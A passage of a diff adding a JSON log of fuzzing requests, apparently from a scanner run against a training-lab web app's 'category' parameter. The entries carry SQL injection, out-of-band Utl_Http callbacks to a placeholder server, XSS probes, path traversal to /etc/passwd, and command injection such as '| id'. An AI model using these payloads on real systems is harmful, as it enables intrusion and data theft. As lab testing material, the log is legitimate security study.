+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "echo 111111"
+        },
+        {
+            "index": 28,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=response.write 111111",
+            "param": "?category=response.write 111111",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "response.write 111111"
+        },
+        {
+            "index": 29,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=:response.write 111111",
+            "param": "?category=:response.write 111111",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": ":response.write 111111"
+        },
+        {
+            "index": 30,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=http://<yourservername>/",
+            "param": "?category=http://<yourservername>/",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "http://<yourservername>/"
+        },
+        {
+            "index": 31,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=‘",
+            "param": "?category=‘",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "‘"
+        },
+        {
+            "index": 32,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=‘--",
+            "param": "?category=‘--",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "‘--"
+        },
+        {
+            "index": 33,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=‘ or 1=1--",
+            "param": "?category=‘ or 1=1--",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "‘ or 1=1--"
+        },
+        {
+            "index": 34,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=' or 1 in (@@version)--",
+            "param": "?category=' or 1 in (@@version)--",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "' or 1 in (@@version)--"
+        },
+        {
+            "index": 35,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category='; waitfor delay '0:30:0'--",
+            "param": "?category='; waitfor delay '0:30:0'--",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "'; waitfor delay '0:30:0'--"
+        },
+        {
+            "index": 36,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category='||Utl_Http.request('http://<yourservername>') from dual--",
+            "param": "?category='||Utl_Http.request('http://<yourservername>') from dual--",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "'||Utl_Http.request('http://<yourservername>') from dual--"
+        },
+        {
+            "index": 37,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=xsstest",
+            "param": "?category=xsstest",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "xsstest"
+        },
+        {
+            "index": 38,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=xsstest%00\"<>'",
+            "param": "?category=xsstest%00\"<>'",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "xsstest%00\"<>'"
+        },
+        {
+            "index": 39,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=</foo>",
+            "param": "?category=</foo>",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "</foo>"
+        },
+        {
+            "index": 40,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=../../../../../../../../../../etc/passwd",
+            "param": "?category=../../../../../../../../../../etc/passwd",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "../../../../../../../../../../etc/passwd"
+        },
+        {
+            "index": 41,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=../../../../../../../../../../boot.ini",
+            "param": "?category=../../../../../../../../../../boot.ini",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "../../../../../../../../../../boot.ini"
+        },
+        {
+            "index": 42,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
+            "param": "?category=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd"
+        },
+        {
+            "index": 43,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\boot.ini",
+            "param": "?category=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\boot.ini",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\boot.ini"
+        },
+        {
+            "index": 44,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &",
+            "param": "?category=|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &"
+        },
+        {
+            "index": 45,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=| ping -i 30 127.0.0.1 |",
+            "param": "?category=| ping -i 30 127.0.0.1 |",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "| ping -i 30 127.0.0.1 |"
+        },
+        {
+            "index": 46,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=| ping -n 30 127.0.0.1 |",
+            "param": "?category=| ping -n 30 127.0.0.1 |",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "| ping -n 30 127.0.0.1 |"
+        },
+        {
+            "index": 47,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=& ping -i 30 127.0.0.1 &",
+            "param": "?category=& ping -i 30 127.0.0.1 &",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "& ping -i 30 127.0.0.1 &"
+        },
+        {
+            "index": 48,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=& ping -n 30 127.0.0.1 &",
+            "param": "?category=& ping -n 30 127.0.0.1 &",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "& ping -n 30 127.0.0.1 &"
+        },
+        {
+            "index": 49,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=; ping 127.0.0.1 ;",
+            "param": "?category=; ping 127.0.0.1 ;",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "; ping 127.0.0.1 ;"
+        },
+        {
+            "index": 50,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=%0a ping -i 30 127.0.0.1 %0a",
+            "param": "?category=%0a ping -i 30 127.0.0.1 %0a",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "%0a ping -i 30 127.0.0.1 %0a"
+        },
+        {
+            "index": 51,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=`ping 127.0.0.1`",
+            "param": "?category=`ping 127.0.0.1`",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "`ping 127.0.0.1`"
+        },
+        {
+            "index": 52,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=| id",
+            "param": "?category=| id",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "| id"
+        },
+        {
+            "index": 53,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=& id",
+            "param": "?category=& id",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "& id"
+        },
+        {
+            "index": 54,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=; id",
+            "param": "?category=; id",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
